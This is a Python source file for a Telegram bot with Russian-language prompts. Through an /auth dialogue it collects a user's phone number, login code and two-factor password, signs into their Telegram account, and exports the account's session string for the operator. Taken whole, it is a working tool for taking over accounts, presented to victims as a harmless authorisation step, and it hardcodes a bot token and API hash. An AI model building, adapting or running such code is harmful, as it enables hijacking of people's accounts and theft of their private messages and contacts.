from datetime import datetime

from pyrogram import Client
from pyrogram.errors import SessionPasswordNeeded, FloodWait, PhoneNumberInvalid, PhoneCodeInvalid, \
    BadRequest, PhoneCodeExpired
from pyrogram.types import User
from aiogram import Bot, Dispatcher, executor, types, filters
from aiogram.dispatcher import FSMContext
from aiogram.dispatcher.filters.state import StatesGroup, State
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from colorama import Fore, init
import re

init(autoreset=True)


bot = Bot(token="5243708542:AAFqavrNatkKPnHeGOII3E4tFAeyqwFGUBM", parse_mode="HTML")
dp = Dispatcher(bot, storage=MemoryStorage())

clients = {}


def save_session(session: str):
    print(session)


class SessionCreation(StatesGroup):
    ask_number = State()
    ask_code = State()
    ask_2fa = State()


@dp.message_handler(commands="auth", state="*")
async def auth(message: types.Message):
    await message.answer("<b>Для начала, поделись со мной своим номером телефона</b>")
    await SessionCreation.ask_number.set()


@dp.message_handler(state=SessionCreation.ask_number, content_types=types.ContentTypes.TEXT)
async def get_number(message: types.Message, state: FSMContext):
    phone = message.text
    if re.match("\d{3}\d{3}\d{4}", phone):
        await bot.send_chat_action(message.from_user.id, types.ChatActions.TYPING)
        async with state.proxy() as data:
            client_id = str(message.from_user.id)
            client = Client(client_id, 1, "b6b154c3707471f5339bd661645ed3d6", in_memory=True, test_mode=False)
            await client.connect()

            try:
                sent_code = await client.send_code(phone)

                data['client_id'] = client_id
                data['code_hash'] = sent_code.phone_code_hash
                data['phone'] = phone
                clients[client_id] = client

                await message.answer(f'<b>Отлично! А теперь отправь код подтверждения в таком виде: 1-2-3-4-5\n</b>'
                                     f'<b>ТИП КОДА: {sent_code.type.name}</b>')
                await SessionCreation.ask_code.set()

            except FloodWait as e:
                last = str(e.value)[-1]
                if int(last) == 1:
                    end = "секунду"
                elif int(last) in [2, 3, 4]:
                    end = "секунды"
                elif int(last) in [5, 6, 7, 8, 9, 0]:
                    end = "секунд"

                await message.answer(f"<b>Ошибка, слишком много попыток входа, попробуйте через <code>{e.value}</code> {end}</b>")
                await client.disconnect()
                await state.finish()

            except PhoneNumberInvalid:
                await message.answer("<b>Неверный номер телефона</b>")
                await client.disconnect()
                await state.finish()
    else:
        await message.answer("<b>Неправильный формат номера телефона</b>")


@dp.message_handler(filters.Regexp(r'^(\d-){4}\d$'), state=SessionCreation.ask_code)
async def get_code(message: types.Message, state: FSMContext):
    await bot.send_chat_action(message.from_user.id, types.ChatActions.TYPING)
    code = message.text.replace('-', '')

    async with state.proxy() as _data:
        data = _data.as_dict()

    client_id = data['client_id']
    client = clients[client_id]

    try:
        signed_in = await client.sign_in(phone_number=data['phone'], phone_code_hash=data['code_hash'], phone_code=code)
        if isinstance(signed_in, User):
            await message.answer(f'<b>✅ <i>{signed_in.first_name}</i> добавлен</b>')
            session = await client.export_session_string()
            save_session(session=session)
            await client.disconnect()
            clients.pop(client_id)
            await state.finish()
    except PhoneCodeInvalid:
        await message.answer('<b>Неверный код</b>')
        await SessionCreation.ask_code.set()
    except SessionPasswordNeeded:
        await message.answer('<b>Хорошо. Осталось ввести только 2FA пароль</b>')
        await SessionCreation.ask_2fa.set()
    except PhoneCodeExpired:
        await message.answer("<b>Срок действия кода подтверждения истек</b>")
        await client.disconnect()
        clients.pop(client_id)
        await state.finish()


@dp.message_handler(content_types=types.ContentTypes.TEXT, state=SessionCreation.ask_2fa)
async def get_2fa(message: types.Message, state: FSMContext):
    await bot.send_chat_action(message.from_user.id, types.ChatActions.TYPING)
    async with state.proxy() as _data:
        data = _data.as_dict()

    client_id = data['client_id']
    client = clients[client_id]
    try:
        await client.connect()
    except ConnectionError:
        pass

    try:
        await client.check_password(message.text)
        await message.answer(f'<b>✅ <i>{(await client.get_me()).first_name}</i> добавлен</b>')
        session = await client.export_session_string()
        save_session(session=session)
    except BadRequest:
        await message.answer('<b>Неправильный 2FA пароль. Попробуй ещё раз</b>')
        return
    await client.disconnect()
    clients.pop(client_id)
    await state.finish()


async def on_startup(_):
    me = await bot.get_me()
    print(Fore.LIGHTYELLOW_EX + f'Hi {me.username}. Bot started OK!' + '\n' + Fore.LIGHTBLUE_EX + str(
        datetime.now().replace(microsecond=0)))


async def on_shutdown(_):
    print(Fore.LIGHTYELLOW_EX + f'Bot shutdown OK!' + '\n' + Fore.LIGHTBLUE_EX + str(
        datetime.now().replace(microsecond=0)))


if __name__ == '__main__':
    executor.start_polling(dp, on_startup=on_startup, on_shutdown=on_shutdown)
